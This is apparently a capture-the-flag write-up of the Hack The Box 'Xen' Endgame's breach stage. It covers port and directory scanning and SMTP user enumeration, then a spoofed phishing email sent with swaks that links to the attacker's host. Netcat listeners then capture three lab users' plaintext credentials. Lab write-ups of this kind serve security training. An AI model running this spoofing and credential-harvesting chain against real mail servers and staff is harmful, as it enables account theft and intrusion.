---
description: >-
  Xen is designed to put your skills in enumeration, breakout, lateral movement,
  and privilege escalation to the test within a small Active Directory
  environment.
---

# Xen



## Breach

```
msplmee@kali:~/HTB/Endgames/Xen$ nmap -p- --min-rate 10000 10.13.38.12 -Pn 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-26 02:25 EDT
Nmap scan report for 10.13.38.12
Host is up (0.33s latency).
Not shown: 65532 filtered tcp ports (no-response)
PORT    STATE SERVICE
25/tcp  open  smtp
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 56.05 seconds
                                                                                                                                                                                             
msplmee@kali:~/HTB/Endgames/Xen$ nmap -p 25,80,443 -sC -sV 10.13.38.12 -Pn 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-26 02:26 EDT
Nmap scan report for 10.13.38.12
Host is up (0.32s latency).

PORT    STATE SERVICE  VERSION
25/tcp  open  smtp
| fingerprint-strings: 
|   GenericLines, GetRequest: 
|     220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
|     sequence of commands
|     sequence of commands
|   Hello: 
|     220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
|     EHLO Invalid domain address.
|   Help: 
|     220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
|     DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
|   NULL: 
|_    220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
| smtp-commands: CITRIX, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp  open  http     Microsoft IIS httpd 7.5
|_http-title: Did not follow redirect to https://humongousretail.com/
|_http-server-header: Microsoft-IIS/7.5
443/tcp open  ssl/http Microsoft IIS httpd 7.5
|_ssl-date: 2023-09-26T06:27:47+00:00; +12s from scanner time.
| ssl-cert: Subject: commonName=humongousretail.com
| Subject Alternative Name: DNS:humongousretail.com
| Not valid before: 2019-03-31T21:05:35
|_Not valid after:  2039-03-31T21:15:35
|_http-server-header: Microsoft-IIS/7.5
|_http-title: Did not follow redirect to https://humongousretail.com/
| sslv2: 
|   SSLv2 supported
|   ciphers: 
|     SSL2_RC4_128_WITH_MD5
|_    SSL2_DES_192_EDE3_CBC_WITH_MD5
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port25-TCP:V=7.93%I=7%D=9/26%Time=651279A5%P=x86_64-pc-linux-gnu%r(NULL
SF:,33,"220\x20ESMTP\x20MAIL\x20Service\x20ready\x20\(EXCHANGE\.HTB\.LOCAL
SF:\)\r\n")%r(Hello,55,"220\x20ESMTP\x20MAIL\x20Service\x20ready\x20\(EXCH
SF:ANGE\.HTB\.LOCAL\)\r\n501\x20EHLO\x20Invalid\x20domain\x20address\.\r\n
SF:")%r(Help,6F,"220\x20ESMTP\x20MAIL\x20Service\x20ready\x20\(EXCHANGE\.H
SF:TB\.LOCAL\)\r\n211\x20DATA\x20HELO\x20EHLO\x20MAIL\x20NOOP\x20QUIT\x20R
SF:CPT\x20RSET\x20SAML\x20TURN\x20VRFY\r\n")%r(GenericLines,6F,"220\x20ESM
SF:TP\x20MAIL\x20Service\x20ready\x20\(EXCHANGE\.HTB\.LOCAL\)\r\n503\x20Ba
SF:d\x20sequence\x20of\x20commands\r\n503\x20Bad\x20sequence\x20of\x20comm
SF:ands\r\n")%r(GetRequest,6F,"220\x20ESMTP\x20MAIL\x20Service\x20ready\x2
SF:0\(EXCHANGE\.HTB\.LOCAL\)\r\n503\x20Bad\x20sequence\x20of\x20commands\r
SF:\n503\x20Bad\x20sequence\x20of\x20commands\r\n");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 11s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 70.52 seconds

```

<figure><img src="../../.gitbook/assets/image (29).png" alt=""><figcaption></figcaption></figure>

```
msplmee@kali:~/HTB/Endgames/Xen$ feroxbuster -u https://humongousretail.com -k -n 

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://humongousretail.com
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       29l       95w     1245c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      111l      323w     3433c https://humongousretail.com/
301      GET        2l       10w      158c https://humongousretail.com/images => https://humongousretail.com/images/
301      GET        2l       10w      155c https://humongousretail.com/css => https://humongousretail.com/css/
301      GET        2l       10w      154c https://humongousretail.com/js => https://humongousretail.com/js/
301      GET        2l       10w      165c https://humongousretail.com/aspnet_client => https://humongousretail.com/aspnet_client/
301      GET        2l       10w      158c https://humongousretail.com/Images => https://humongousretail.com/Images/
403      GET       29l       92w     1233c https://humongousretail.com/WEB-INF
301      GET        2l       10w      155c https://humongousretail.com/CSS => https://humongousretail.com/CSS/
301      GET        2l       10w      154c https://humongousretail.com/JS => https://humongousretail.com/JS/
301      GET        2l       10w      154c https://humongousretail.com/Js => https://humongousretail.com/Js/
301      GET        2l       10w      155c https://humongousretail.com/Css => https://humongousretail.com/Css/
301      GET        2l       10w      158c https://humongousretail.com/remote => https://humongousretail.com/remote/
403      GET       29l       92w     1233c https://humongousretail.com/META-INF
301      GET        2l       10w      158c https://humongousretail.com/IMAGES => https://humongousretail.com/IMAGES/
401      GET       29l      100w     1293c https://humongousretail.com/jakarta
301      GET        2l       10w      165c https://humongousretail.com/Aspnet_client => https://humongousretail.com/Aspnet_client/
403      GET       29l       92w     1233c https://humongousretail.com/web-inf
301      GET        2l       10w      165c https://humongousretail.com/aspnet_Client => https://humongousretail.com/aspnet_Client/
301      GET        2l       10w      158c https://humongousretail.com/Remote => https://humongousretail.com/Remote/
301      GET        2l       10w      165c https://humongousretail.com/ASPNET_CLIENT => https://humongousretail.com/ASPNET_CLIENT/
400      GET        6l       26w      324c https://humongousretail.com/error%1F_log
[####################] - 3m     30000/30000   0s      found:21      errors:0      
[####################] - 3m     30000/30000   153/s   https://humongousretail.com/
```

<figure><img src="../../.gitbook/assets/image (31).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

```
msplmee@kali:~/HTB/Endgames/Xen$ smtp-user-enum -U /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -D humongousretail.com -t 10.13.38.12 -m 50 -M RCPT
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... RCPT
Worker Processes ......... 50
Usernames file ........... /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt
Target count ............. 1
Username count ........... 21168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ humongousretail.com

######## Scan started at Tue Sep 26 02:45:31 2023 #########

10.13.38.12: it@humongousretail.com exists
10.13.38.12: legal@humongousretail.com exists
10.13.38.12: marketing@humongousretail.com exists
10.13.38.12: sales@humongousretail.com exists
10.13.38.12: SALES@humongousretail.com exists
######## Scan completed at Tue Sep 26 02:57:28 2023 #########
5 results.

21168 queries in 717 seconds (29.5 queries / sec)
```

```
msplmee@kali:~$ swaks --to sales@humongousretail.com --from it@humongousretail.com --header "Subject: Credentials / Errors" --body "citrix http://10.10.14.5/" --server humongousretail.com
=== Trying humongousretail.com:25...
=== Connected to humongousretail.com.
<-  220 ESMTP MAIL Service ready (EXCHANGE.HTB.LOCAL)
 -> EHLO kali
<-  250-CITRIX
<-  250-SIZE 20480000
<-  250-AUTH LOGIN
<-  250 HELP
 -> MAIL FROM:<it@humongousretail.com>
<-  250 OK
 -> RCPT TO:<sales@humongousretail.com>
<-  250 OK
 -> DATA
<-  354 OK, send.
 -> Date: Tue, 26 Sep 2023 02:57:11 -0400
 -> To: sales@humongousretail.com
 -> From: it@humongousretail.com
 -> Subject: Credentials / Errors
 -> Message-Id: <20230926025711.221379@kali>
 -> X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/
 -> 
 -> citrix http://10.10.14.5/
 -> 
 -> 
 -> .
<-  250 Queued (9.472 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.
```

```
msplmee@kali:~$ nc -lnvp 80 
listening on [any] 80 ...
connect to [10.10.14.5] from (UNKNOWN) [10.13.38.12] 55717
POST /remote/auth/login.aspx?LoginType=Explicit&user=jmendes&password=VivaBARC3L0N@!!!&domain=HTB.LOCAL HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Host: 10.10.14.5
Content-Length: 76
Expect: 100-continue
Connection: Keep-Alive

LoginType=Explicit&user=jmendes&password=VivaBARC3L0N%40!!!&domain=HTB.LOCAL
```

```
msplmee@kali:~$ nc -lnvp 80
listening on [any] 80 ...
connect to [10.10.14.5] from (UNKNOWN) [10.13.38.12] 55738
POST /remote/auth/login.aspx?LoginType=Explicit&user=pmorgan&password=Summer1Summer!&domain=HTB.LOCAL HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Host: 10.10.14.5
Content-Length: 72
Expect: 100-continue
Connection: Keep-Alive

LoginType=Explicit&user=pmorgan&password=Summer1Summer!&domain=HTB.LOCAL
```

```
msplmee@kali:~$ nc -lnvp 80 
listening on [any] 80 ...
connect to [10.10.14.5] from (UNKNOWN) [10.13.38.12] 55754
POST /remote/auth/login.aspx?LoginType=Explicit&user=awardel&password=@M3m3ntoM0ri@&domain=HTB.LOCAL HTTP/1.1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36
Host: 10.10.14.5
Content-Length: 75
Expect: 100-continue
Connection: Keep-Alive

LoginType=Explicit&user=awardel&password=%40M3m3ntoM0ri%40&domain=HTB.LOCAL
```

<figure><img src="../../.gitbook/assets/image (33).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (34).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

